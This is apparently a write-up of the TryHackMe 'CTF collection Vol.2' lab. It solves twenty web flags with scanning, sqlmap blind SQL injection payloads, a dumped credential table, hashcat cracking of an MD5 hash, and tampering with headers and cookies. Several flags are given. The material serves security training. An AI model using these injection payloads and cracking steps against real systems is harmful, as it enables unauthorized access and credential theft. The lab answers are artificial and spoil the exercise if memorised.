<p align="center">
  THM : CTF collection Vol.2<br>
  Difficulty : Medium<br>
  <img src="https://i.imgur.com/PVCxMYA.png">
</p>

## Summary
- [Nmap Scan](#nmap-scan)
- [Dirb Scan](#dirb-scan)
- [Easter 1](#Easter-1)
- [Easter 2](#Easter-2)
- [Easter 3](#Easter-3)
- [Easter 4](#Easter-4)
- [Easter 5](#Easter-5)
- [Easter 6](#Easter-6)
- [Easter 7](#Easter-7)
- [Easter 8](#Easter-8)
- [Easter 9](#Easter-9)
- [Easter 10](#Easter-10)
- [Easter 11](#Easter-11)
- [Easter 12](#Easter-12)
- [Easter 13](#Easter-13)
- [Easter 14](#Easter-14)
- [Easter 15](#Easter-15)
- [Easter 16](#Easter-16)
- [Easter 17](#Easter-17)
- [Easter 18](#Easter-18)
- [Easter 19](#Easter-19)
- [Easter 20](#Easter-20)
- [Conclusion](#conclusion)

## Nmap Scan
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/CTF_Collection_Vol2]
└─$ nmap 10.10.188.111 -A -p- -oN nmapResults.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 21:47 CEST
Nmap scan report for 10.10.188.111
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)                                         
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)                                        
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))                                                    
|_http-server-header: Apache/2.2.22 (Ubuntu)                                                           
|_http-title: 360 No Scope!                                                                            
| http-robots.txt: 1 disallowed entry                                                                  
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=                                                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                
                                                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .         
Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds
```

## Dirb Scan

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbResults
START_TIME: Sun Aug 28 01:04:05 2022
URL_BASE: http://10.10.188.111/
WORDLIST_FILES: /home/attacker/Documents/Outils/SecLists/Discovery/Web-Content/big.txt
EXTENSIONS_LIST: (.php,,) | (.php)() [NUM = 2]

-----------------

GENERATED WORDS: 20465                                                         

---- Scanning URL: http://10.10.188.111/ ----
+ http://10.10.188.111/button (CODE:200|SIZE:39148)                                                   
+ http://10.10.188.111/cat (CODE:200|SIZE:62048)                                                      
+ http://10.10.188.111/cgi-bin/ (CODE:403|SIZE:289)                                                   
+ http://10.10.188.111/dinner (CODE:200|SIZE:1264533)                                                 
+ http://10.10.188.111/egg (CODE:200|SIZE:25557)                                                      
+ http://10.10.188.111/index.php (CODE:200|SIZE:94328)                                                
+ http://10.10.188.111/index (CODE:200|SIZE:94328)                                                    
+ http://10.10.188.111/iphone (CODE:200|SIZE:19867)                                                   
==> DIRECTORY: http://10.10.188.111/login/                                                            
+ http://10.10.188.111/nicole (CODE:200|SIZE:367650)                                                  
==> DIRECTORY: http://10.10.188.111/ready/                                                            
+ http://10.10.188.111/robots (CODE:200|SIZE:430)                                                     
+ http://10.10.188.111/robots.txt (CODE:200|SIZE:430)                                                 
+ http://10.10.188.111/server-status (CODE:403|SIZE:294)                                              
+ http://10.10.188.111/small (CODE:200|SIZE:689)                                                      
+ http://10.10.188.111/static (CODE:200|SIZE:253890)                                                  
+ http://10.10.188.111/ty (CODE:200|SIZE:198518)                                                      
+ http://10.10.188.111/who (CODE:200|SIZE:3847428)                                                    
                                                                                                      
---- Entering directory: http://10.10.188.111/login/ ----
+ http://10.10.188.111/login/index.php (CODE:200|SIZE:782)                                            
+ http://10.10.188.111/login/index (CODE:200|SIZE:782)                                                
                                                                                                      
---- Entering directory: http://10.10.188.111/ready/ ----
+ http://10.10.188.111/ready/gone.php (CODE:200|SIZE:283)                                             
+ http://10.10.188.111/ready/gone (CODE:200|SIZE:283)                                                 
+ http://10.10.188.111/ready/index.php (CODE:200|SIZE:276)                                            
+ http://10.10.188.111/ready/index (CODE:200|SIZE:276)                                                
                                                                                                      
-----------------
END_TIME: Sun Aug 28 02:08:01 2022
DOWNLOADED: 122790 - FOUND: 22
```

## Easter 1

If we look at robots.txt, we see one disallowed entry, and at the bottom, we see a string that seems to be ASCII encoded.  
```
...
45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```
If we decode it using an online tool like https://www.dcode.fr/code-ascii, we have our first flag.  
![](https://i.imgur.com/YBjxdVH.png)  

## Easter 2

In the robots.txt file, if we look at the only disallowed entry, it seems that it is a base64 encoded string. 
```
VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
```
Let's decode it using https://www.dcode.fr/code-base-64 : ``VSBpIEIgSCBJIEYgWSBnIGUgaSBCIFQgSSBEIEkgZyBWIGkgQiB6IEkgRiBnIGcgTSB5IEIgTyBJIEcgdyBnIFcgUyBBIHogSSBFIG8gZyBiIEMgQiBrIEkgRSBZIGcgTyBTIEIgcCBJIEYgayBnIFcgQyBCIE8gSSBHIHcgPQ%3D%3D``  

It looks like it is a base64 encoded string again, but also URL encoded, because of the %3D at the end, which is the URL encoding of '='.  

Let's decode it again using the same base64 decoder : ``U i B H I F Y g e i B T I D I g V i B z I F g g M y B O I G w g W S A z I E o g b C B k I E Y g O S B p I F k g W C B O I G w =``

We have again a new base64 encoded string, let's decode it again (it is not necessary to remove the spaces) : ``R G V z S 2 V s X 3 N l Y 3 J l d F 9 i Y X N l``

Now we have ... a base64 encoded string AGAIN ! So let's decode it : ``DesKel_secret_base``

It seems that we have now a directory of the web server. Let's check it out.
![alt text](https://i.imgur.com/GnDyW2J.png)  

If we look at the source code, we see a flag written in white, so we cannot see it without reading the source code or selecting it to make it appear (Using CTRL + A for exemple).  
![alt text](https://i.imgur.com/IdbMbcb.png)  
![alt text](https://i.imgur.com/7993t0Y.png)  

## Easter 3

If we go to the login page found by dirb, looking at the source code, we see an hidden p tag where we can found the easter number 3.  
![alt text](https://i.imgur.com/PPxeKOo.png)

## Easter 4

On the same login page where we found the Easter 3, I captured the POST request using [Burp Suite](https://portswigger.net/burp) after pressing the 
login button. I saved this request, and after that, I used sqlmap on this request. Sqlmap found that the parameter 'username' is vulnerable to 
boolean-based blind injection and time-based blind injection :  
```
┌──(attacker㉿AttackBox)-[~/Bureau]
└─$ sqlmap -r request.txt --level=5 --risk=3 --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:04:32 /2022-10-01/

[14:04:32] [INFO] parsing HTTP request from 'request.txt'
[14:04:32] [INFO] testing connection to the target URL
[14:04:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:04:32] [INFO] testing if the target URL content is stable
[14:04:33] [INFO] target URL content is stable
[14:04:33] [INFO] testing if POST parameter 'username' is dynamic
...
...
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-6465' OR 6779=6779-- mjCd&password=test&submit=submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 6357 FROM (SELECT(SLEEP(5)))NnRW)-- LhFY&password=test&submit=submit
---

```

We can exploit this vulnerability and dump the database THM\_f0und\_m3 using 
``sqlmap -r request.txt --level=5 --risk=3 --dump``  

We found the Easter4 in the table nothing_inside.  
```
[14:08:09] [INFO] retrieved: THM{1nj3c7***********}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_***********} |
+-------------------------+
```

Sqlmap also found a table named user where we can find two users and one of them with a password hash.  
```
Database: THM_f0und_m3
Table: user
[2 entries]
+------------------------------------+----------+
| password                           | username |
+------------------------------------+----------+
| 05f3672ba34409136aa71b8d00070d1b   | DesKel   |
| He is a nice guy, say hello for me | Skidy    |
+------------------------------------+----------+
```

## Easter 5

If we try to analyse the hash we found in the database earlier, using a tool like [Hashes.com](https://hashes.com/en/tools/hash_identifier), 
we can see it is an MD5 hash.  
![](https://i.imgur.com/qP93LYA.png)  

We can try to crack this hash with hashcat and the rockyou.txt wordlist :  
```
┌──(attacker㉿AttackBox)-[~]
└─$ hashcat -a 0 -m 0 05f3672ba34409136aa71b8d00070d1b /usr/share/wordlists/rockyou.txt -w 3
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.1 AMD-APP (3110.6)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: Radeon RX 580 Series, 7424/7523 MB (4048 MB allocatable), 36MCU
...
05f3672ba34409136aa71b8d00070d1b:cutie                    
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 05f3672ba34409136aa71b8d00070d1b
...
```

Now if use the credentials DesKel:cutie in the login page, we have the Easter 5.
![](https://i.imgur.com/s2WrMZp.png)

## Easter 6

Using burp suite, if we look at the response header of a simple GET request to the index page, we can see a response header named 
'Busted', with the value ``Hey, you found me, take this Easter 6: THM{***************}``  
![](https://i.imgur.com/ko6r96e.png)  

## Easter 7

Using burp suite, we see that there is a cookie named "Invited" with the value 0. 
![](https://i.imgur.com/HRXNvtw.png)  

If we set this value to 1, we can get the Easter 7.
![](https://i.imgur.com/n74MPgl.png)

## Easter 8

Looking at the index page, we see that a hidden message will be shown only if we are using an Iphone using iOS 13.1.2 and Safari 13. 
![](https://i.imgur.com/7drNBY9.png)

I directly knew what I had to do. I had to change my User-Agent. To do this, I use an extension named User-Agent Switcher (you can 
download it [here](https://addons.mozilla.org/fr/firefox/addon/user-agent-switcher-revived/) for Mozilla Firefox, or you can just use [Burp Suite](https://portswigger.net/burp) to edit the User-Agent in the Repeater). So I searched for User-Agents 
corresponding to this version of Safary and iOS on internet, I found some websites where we can search for user agents but I didn't found one working. 
So I had to look at the hint for this Easter. They give us the User Agent string, so I just used it and it worked.
![](https://i.imgur.com/xTdHEjI.png)

The reason why it didn't worked when I tried by myself is because all the User-Agents I tried where not exactly from the same version of Safari as expected.  

For exemple, I tried this one :  
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/625.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1  
Which is corresponding to iOS 13.1.2 on an iPhone, it is also Safari 13...  

But if you compare it to the User-Agent given in the hint :  
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) **AppleWebKit/625.1.15** (KHTML, like Gecko) **Version/13.0.3** Mobile/15E148 Safari/604.1 <- One exemple of user-agents I tried without success  
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) **AppleWebKit/605.1.15** (KHTML, like Gecko) **Version/13.0.1** Mobile/15E148 Safari/604.1 <- The one given in the hint  

You see that there is two differences between those two User-Agents. The Apple WebKit version, and the Safari version is also Safari 13 but not EXACTLY the same (I tried 13.0.3 but it was 13.0.1...)! When I saw that I was really close to finding it by myself... I was very frustrated that only this little difference made me use the hint for this question.

## Easter 9

Going to the /ready/ directory, before we are redirected to the page /ready/gone.php, there is a HTML comment in the source code where we can 
find the Easter 9. I only know two methods to get it, the first one is simply spamming ESCAPE to stop the redirect. The second is by using 
[Burp Suite](https://portswigger.net/burp) to capture the result of the request to /ready/.  
![](https://i.imgur.com/OqxPqKO.png)  

## Easter 10

On the index page, there is a hyperlink redirecting to /free_sub/ directory. If we go take a look at this directory, we get this message :  
![](https://i.imgur.com/d4NexZI.png)  

How can we make the web server think we are coming from TryHackMe ? If you look at HTTP GET requests, you can see sometimes an header named Referer. 
Maybe we can use this header to let the server know we are coming from THM. So again I used burp suite, I captured the GET request 
to this page. Then I sent it to the Repeater. I added the Referer header (you can find a documentation on this header 
![here](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Referer)) to the request and I tried multiple values :  
- https://tryhackme.com/
- http://tryhackme.com/
- tryhackme.com/
- tryhackme.com

Only the last one was working. So if we use it as a Referer, we can get the Easter 10.
![](https://i.imgur.com/vPDIecE.png)
![](https://i.imgur.com/C0ajJKS.png)

## Easter 11

In the index page, there is a combo box where you can choose a menu.  
![](https://i.imgur.com/QHwo3ka.png)  

If you use salad, you get the following message : ``Mmmmmm... what a healthy choice, I prefer an egg``.
So I used burp suite to capture the POST request when pressing the 'Take it!' button :  
![](https://i.imgur.com/bvYmidX.png)  

I sent this request to the Repeater, then I changed the value of the dinner parameter to egg :  
![](https://i.imgur.com/bGR3ufI.png)  

I sent the request, and I got the Easter 11 !  
![](https://i.imgur.com/GN1Gz6D.png)  

## Easter 12

Using the developer tool embedded with the web browser, you can go to the Debugger tab to see the different files loaded by the web browser. 
You can see that there is a JavaScript file loaded, named jquery-9.1.2.js.  
![](https://i.imgur.com/I2MJXSg.png)  

If we take a look at it, we see a function named ahem() that returns a string. So let's try to call this function using the console of the web browser.  
![](https://i.imgur.com/Izij9NE.png)  
And we have the Easter 12 !

## Easter 13

Looking at the `ready` directory on the webserver, we see a gif of someone pressing a red button.  
![](https://i.imgur.com/8gWoLgA.png)  

If we wait a couple of seconds, we are redirected to /ready/gone.php, where we can find the Easter 13.  
![](https://i.imgur.com/WEJ4moF.png)  

## Easter 14

On the index page of the website, if we look at the source code, we can find a comment that is an HTML image tag.  
![](https://i.imgur.com/yM7sScq.png)  

We can take the base64 part of the comment and write it in a file. I named the file `img.base64`.
Then, we can write the result of the base64 decoding to a png file like this : ``cat img.base64 | base64 -d > img.png``  
And now if we open the image :  
![](https://i.imgur.com/Mbboynx.png)  

## Easter 15

Going to /game1/ we have an enigma to solve. We also have a hint : 51 89 77 93 126 14 93 10.  
Fist I tried to put some random chars. It tells us the result of our input. 
For exemple, a is equal to 89. 
![](https://i.imgur.com/zSQXTKa.png)

I entered all the letters, the uppercases, the digits... From here I can see the value of all characters... So, if we make our "hash" correspond to the 
hint by entering the good characters, it makes `GameOver`. Now we have the Easter 15 !  
![](https://i.imgur.com/tunbmx0.png)

## Easter 16

Looking at /game2 directory, we see this :  
![](https://i.imgur.com/Hebjght.png)  

So it's simple, we just need to capture the POST request using one of the 3 buttons using [Burp Suite](https://portswigger.net/burp). Then, 
we can edit the POST data to simulate the 3 buttons pressed at once.  
![](https://i.imgur.com/8n4sKnc.png)  

And if we look at the response :  
![](https://i.imgur.com/ibalsrM.png)  

We have the easter 16 !

## Easter 17

Looking again at the index page, we can find a button named Mulfunction button.  
![](https://i.imgur.com/g9eJZ0y.png)  

Clicking on it do nothing. If we look at the source code, we see that it tries to call a function named nyan. If we try to call it in the console, 
we see that this function is not defined.  
![](https://i.imgur.com/tbwEM19.png)  

If we look a little bit lower on the source code, we can see a script tag.  
![](https://i.imgur.com/bYCci3u.png)  

So we can see that a function is defined here named catz. Let's call it in the console. There is a binary string that appeared on the page.  
![](https://i.imgur.com/SlN1vfv.png)  

The first thing I tried to do was to decode directly to ASCII but the result was too weird to be the good result.
So I decoded the binary to hexadecimal : 4561737465722031373A2054484D7B6A355F6A355F6B33705F6433633064337D  
Then I decoded this hexadecimal to ASCII :  
![](https://i.imgur.com/6mA4bi7.png)  

## Easter 18

In the index page, a message tells us to say YES to the egg.  
![](https://i.imgur.com/GSK9lYk.png)  

So I used Burp Suite to send 'egg=YES' as POST data but it didn't worked. So I tried to use this as a HTTP header like this :  
![](https://i.imgur.com/NWUfZo0.png)  

And looking at the response code :  
![](https://i.imgur.com/RZt3K0E.png)  
And we have the Easter 18 !

## Easter 19

Looking at the /small page, we can see the Easter 19 :  
![](https://i.imgur.com/3WrMcwR.png)

## Easter 20
Looking at the end of the index page, we can see this :  
![](https://i.imgur.com/Lv7Thuv.png)  

So we have to use the POST method with the following data : username=DesKel&password=heIsDumb  
I used Burp Suite to do this :  
![](https://i.imgur.com/wn1hJmR.png)  

And we have the last flag !  
![](https://i.imgur.com/m1OjmVg.png)

## Conclusion

This CTF was very hard, not because it was technical, but because it was very long to do and I think this CTF was made to test your 
patience and your mental endurance. Thanks for this room !
